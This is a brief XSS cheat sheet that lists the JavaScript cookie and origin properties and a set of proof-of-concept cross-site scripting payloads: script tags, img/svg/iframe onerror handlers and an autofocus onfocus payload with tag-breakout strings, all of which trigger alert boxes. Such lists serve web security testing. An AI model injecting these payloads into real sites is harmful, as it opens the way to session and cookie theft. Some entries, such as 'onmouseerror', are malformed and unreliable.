# 02 - JavaScript

Search Tag(s): #helpers #xss

## 2.1 - JavaScript Cookie Properties

```
document.cookie
window.origin
document.cookie
```

## 2.2 - JavaScript Pop-Up Message

```
<script>alert(1)</script>
<script>print()</script>

<img src="" onerror=alert(1)>
<img src=# onmouseerror=alert(1)>
<svg src="" onerror=alert(1)>
<img src=# onmouseerror=alert(1)>

<iframe src="" onerror=alert(1)>

<input autofocus onfocus="setTimeout(function() {alert(1)}, 5000);"></input><;/style<;/title<;/textarea<;/script>
```